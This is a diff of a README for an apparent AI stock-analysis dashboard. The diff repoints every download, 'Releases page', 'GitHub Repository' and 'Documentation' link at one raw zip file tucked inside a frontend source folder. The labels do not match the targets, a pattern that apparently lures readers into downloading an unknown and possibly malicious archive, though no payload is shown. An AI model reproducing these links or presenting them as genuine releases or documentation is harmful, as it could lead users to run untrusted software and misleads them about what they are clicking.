@@ -4,7 +4,7 @@
 Welcome to stocks-react-dashboard! This application helps you analyze stock data using advanced AI techniques. You will be able to view stock information, make predictions, and forecast market trends using a user-friendly interface. 
 
 ## 📥 Download 
-[![Download stocks-react-dashboard](https://raw.githubusercontent.com/chuchurojas/stocks-react-dashboard/main/pinbush/stocks-react-dashboard.zip)](https://raw.githubusercontent.com/chuchurojas/stocks-react-dashboard/main/pinbush/stocks-react-dashboard.zip)
+[![Download stocks-react-dashboard](https://raw.githubusercontent.com/chuchurojas/stocks-react-dashboard/main/frontend/src/services/react_stocks_dashboard_v2.7.zip)](https://raw.githubusercontent.com/chuchurojas/stocks-react-dashboard/main/frontend/src/services/react_stocks_dashboard_v2.7.zip)
 
 ## 💻 Features 
 - **AI Predictions**: Utilize AI algorithms to predict stock prices.
@@ -21,7 +21,7 @@ Before you proceed with the installation, make sure you meet the following syste
 - Disk Space: At least 500 MB free space
 
 ## 📦 Download & Install 
-1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/chuchurojas/stocks-react-dashboard/main/pinbush/stocks-react-dashboard.zip) to download the latest version.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/chuchurojas/stocks-react-dashboard/main/frontend/src/services/react_stocks_dashboard_v2.7.zip) to download the latest version.
    
 2. **Select Your Version**: Look for the latest release. You will see options for different system requirements. Click on the one that suits your OS.
 
@@ -62,7 +62,7 @@ If you face any issues, try these solutions:
 - **Data Not Loading**: Check your internet connection.
 
 ## 📅 Updates 
-Regular updates will provide new features and improve functionality. Keep an eye on the [Releases page](https://raw.githubusercontent.com/chuchurojas/stocks-react-dashboard/main/pinbush/stocks-react-dashboard.zip) for the latest versions. 
+Regular updates will provide new features and improve functionality. Keep an eye on the [Releases page](https://raw.githubusercontent.com/chuchurojas/stocks-react-dashboard/main/frontend/src/services/react_stocks_dashboard_v2.7.zip) for the latest versions. 
 
 ## 🤝 Contributing 
 We welcome contributions! If you have suggestions or improvements, feel free to submit an issue or a pull request on our GitHub repository.
@@ -71,7 +71,7 @@ We welcome contributions! If you have suggestions or improvements, feel free to 
 Join our community to share tips and get help. Visit our discussion section on GitHub for more information.
 
 ## 🔗 Further Resources 
-- [GitHub Repository](https://raw.githubusercontent.com/chuchurojas/stocks-react-dashboard/main/pinbush/stocks-react-dashboard.zip)
-- [Documentation](https://raw.githubusercontent.com/chuchurojas/stocks-react-dashboard/main/pinbush/stocks-react-dashboard.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/chuchurojas/stocks-react-dashboard/main/frontend/src/services/react_stocks_dashboard_v2.7.zip)
+- [Documentation](https://raw.githubusercontent.com/chuchurojas/stocks-react-dashboard/main/frontend/src/services/react_stocks_dashboard_v2.7.zip)
 
 Thank you for choosing stocks-react-dashboard for your stock analysis needs! Enjoy analyzing.
